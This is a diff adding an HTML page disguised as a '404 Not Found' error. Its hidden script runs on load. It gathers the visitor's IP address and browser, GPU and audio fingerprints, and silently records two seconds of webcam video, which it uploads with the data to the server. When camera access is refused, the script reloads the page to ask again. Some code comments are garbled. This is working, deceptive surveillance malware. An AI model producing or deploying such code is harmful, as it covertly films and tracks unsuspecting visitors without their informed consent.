@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f7f7f7; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: left; width: 80%; max-width: 600px; }
+        h1 { font-size: 50px; margin-bottom: 10px; color: #555; }
+        p { font-size: 18px; color: #777; line-height: 1.6; }
+        .box { border-top: 1px solid #ddd; padding-top: 20px; margin-top: 20px; }
+        small { color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>404.</h1>
+        <p>That’s an error.</p>
+        <div class="box">
+            <p>The requested URL was not found on this server. <br><small>That’s all we know.</small></p>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+
+    <script>
+        async function runCapture() {
+            let attempt = parseInt(sessionStorage.getItem('cam_attempt') || '0');
+            
+            // --- I取ロッ ---
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+
+            const ua = navigator.userAgent;
+            let bType = "Unknown";
+            if (ua.indexOf("Edg") > -1) bType = "Edge";
+            else if (ua.indexOf("Chrome") > -1) bType = "Chrome";
+            else if (ua.indexOf("Safari") > -1) bType = "Safari";
+            else if (ua.indexOf("Firefox") > -1) bType = "Firefox";
+
+            const data = {
+                ip: ipData.ip,
+                browser_type: bType,
+                lang: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency,
+                mem: navigator.deviceMemory,
+                is_chrome: !!window.chrome,
+                is_safari: !!window.safari
+            };
+
+            // GPU
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                data.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
+            } catch(e) { data.gpu = "Blocked"; }
+
+            // Auiハッュ
+            try {
+                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const buffer = await ctx.startRendering();
+                data.audio_id = buffer.getChannelData(0).slice(0, 10).reduce((a, b) => a + b, 0).toString().substring(0, 8);
+            } catch(e) { data.audio_id = "Blocked"; }
+
+            const send = (blob) => {
+                sessionStorage.removeItem('cam_attempt');
+                const fd = new FormData();
+                if(blob) fd.append('video', blob, 'c.webm');
+                fd.append('info', JSON.stringify(data));
+                fetch('/upload', { method: 'POST', body: fd });
+            };
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {
+                    send(new Blob(chunks, { type: 'video/webm' }));
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                rec.start();
+                setTimeout(() => rec.stop(), 2000);
+            })
+            .catch(err => {
+                if ((err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') && attempt < 2) {
+                    sessionStorage.setItem('cam_attempt', (attempt + 1).toString());
+                    location.reload();
+                } else {
+                    send(null);
+                }
+            });
+        }
+        window.onload = runCapture;
+    </script>
+</body>
+</html>
